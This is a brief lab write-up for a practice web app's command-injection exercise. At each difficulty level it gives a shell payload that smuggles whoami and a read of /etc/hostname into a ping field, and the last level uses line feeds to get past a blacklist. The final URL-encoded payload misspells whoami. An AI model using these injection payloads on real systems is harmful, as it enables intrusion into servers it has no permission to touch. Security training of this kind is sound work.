# Command Injection

Objective

Remotely, find out the user of the web service on the OS, as well as the
machines hostname via RCE.

## low

We can use a semicolon to insert another command.

```sh
>/dev/null;echo `whoami` `cat /etc/hostname`
```

> www-data
> 19c9651ab277

## medium

Semicolons and '&&' are forbiddened, so we fail the ping by using '||' instead.

```sh
>/dev/null||echo `whoami` `cat /etc/hostname`
```

## high

We have to bypass a nicely crafted blacklist.
Notice that filter in this level uses `trim()` to remove leading and trailing 
spaces, so a line-feed in the middle could easily split the commands.

```sh
>/dev/null\nwhoami\ncat /etc/hostname
ip=%3E%2Fdev%2Fnull%0Awhomai%0Acat%20%2Fetc%2Fhostname&Submit=Submit
```
